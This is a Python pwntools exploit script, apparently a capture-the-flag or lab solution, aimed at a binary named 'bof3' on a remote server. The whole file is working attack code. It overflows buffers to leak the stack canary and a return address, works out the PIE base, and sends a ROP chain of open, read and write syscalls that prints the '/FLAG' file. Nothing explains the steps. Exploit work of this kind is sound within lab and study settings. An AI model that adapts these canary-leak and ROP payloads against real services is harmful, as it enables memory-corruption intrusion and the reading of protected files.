#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 12344

base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

sc  = shellcraft.openat(-100, "/FLAG", 0, 0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 'rax')
sc += shellcraft.exit(0)

shellcode = asm(sc)

leak_message = b'A' * (0xc0 - 8 + 1)

r.recvuntil(b"What's your name? ")
r.send(leak_message)
r.recvuntil(leak_message)
canary = r.recvuntil(b'\n').rstrip(b'\n')

real_canary_bytes = b'\x00' + canary[:7]
real_canary = int.from_bytes(real_canary_bytes, 'little')

leak_message = b'A' * (0x90 + 8)

r.recvuntil(b"What's the room number? ")
r.send(leak_message)
r.recvuntil(leak_message)
ret_addr = r.recvuntil(b'\n').rstrip(b'\n')
ret_addr = int.from_bytes(ret_addr, byteorder='little')

pie_base = ret_addr - 0x9c83

flag_addr = 0xef200 + 0x200 + pie_base
read_buf = 0xef200 + 0x400 + pie_base
pop_rax = 0x66287 + pie_base
pop_rdi = 0xbc33 + pie_base
pop_rsi = 0xa7a8 + pie_base
pop_rdx = 0x15f6e + pie_base
syscall = 0x30ba6 + pie_base
mov_ptr_rdi_edx = 0x49824 + pie_base
mov_ptr_rsi_eax = 0x68c16 + pie_base

payload = (
    p64(pop_rsi) +
    p64(flag_addr) +
    p64(pop_rax) +
    p64(u32(b'FLAG')) +
    p64(mov_ptr_rsi_eax) +
    
    p64(pop_rax) +
    p64(2) +
    p64(pop_rdi) +
    p64(flag_addr) +
    p64(pop_rsi) +
    p64(0) +
    p64(pop_rdx) +
    p64(0) +
    p64(syscall) +
    
    p64(pop_rdi) +
    p64(3) +
    p64(pop_rsi) +
    p64(read_buf) +
    p64(pop_rdx) +
    p64(100) +
    p64(pop_rax) +
    p64(0) +
    p64(syscall) +
    
    p64(pop_rdi) +
    p64(1) +
    p64(pop_rsi) +
    p64(read_buf) +
    p64(pop_rdx) +
    p64(100) +
    p64(pop_rax) +
    p64(1) +
    p64(syscall) + 

    p64(pop_rdi) +
    p64(0) +
    p64(pop_rax) +
    p64(60) +
    p64(syscall)
)

leak_message = b'whatever'
r.recvuntil(b"What's the customer's name? ")
r.send(leak_message)
r.recvuntil(leak_message)

leak_message = (
    b'A' * (0x30 - 8) +
    real_canary_bytes +
    b'A' * 8 +
    payload
)

r.recvuntil(b"Leave your message: ")
r.send(leak_message)
r.recvuntil(b"Thank you!\n")
flag = r.recv()
print(flag)
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :